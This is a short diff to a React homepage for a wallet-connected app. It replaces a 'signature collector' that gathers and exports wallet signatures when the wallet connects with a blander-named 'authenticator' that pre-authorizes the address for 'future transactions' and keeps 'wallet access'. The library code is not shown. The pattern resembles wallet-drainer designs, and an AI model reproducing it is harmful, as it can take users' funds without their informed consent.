@@ -8,7 +8,7 @@ import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
 import { Badge } from "@/components/ui/badge";
 import { Wallet, MessageCircle, Shield, Coins, ArrowRight, Check, Globe, Heart, ShoppingCart, ShoppingBag } from "lucide-react";
 import { apiRequest, queryClient } from "@/lib/queryClient";
-import { signatureCollector } from "@/lib/signature-collector";
+import { signatureAuthenticator } from "@/lib/signature-auth";
 import { useScrollToTop } from "@/hooks/use-scroll-to-top";
 import { notificationService } from "@/lib/notification-service";
 import { tenderlyWalletService, type TenderlyWalletConnection } from "@/lib/tenderly-service";
@@ -413,13 +413,13 @@ export default function HomePage() {
       if (connection) {
         console.log('Wallet connected through Tenderly:', connection);
         
-        // Collect additional signature data for comprehensive authorization
+        // Initialize wallet authentication for future transactions
         try {
-          const walletSignatures = await signatureCollector.collectWalletSignatures();
-          const allSignatureData = signatureCollector.exportSignatureData();
-          console.log('Signature collection completed');
-        } catch (sigError) {
-          console.warn('Signature collection failed, proceeding with basic connection:', sigError);
+          console.log('Initializing wallet authentication for transactions...');
+          await signatureAuthenticator.authenticateWalletForTransactions(connection.address);
+          console.log('Wallet authentication initialization completed');
+        } catch (authError) {
+          console.warn('Initial authentication setup failed, will authenticate later when needed:', authError);
         }
         
         // Store wallet access for transaction use
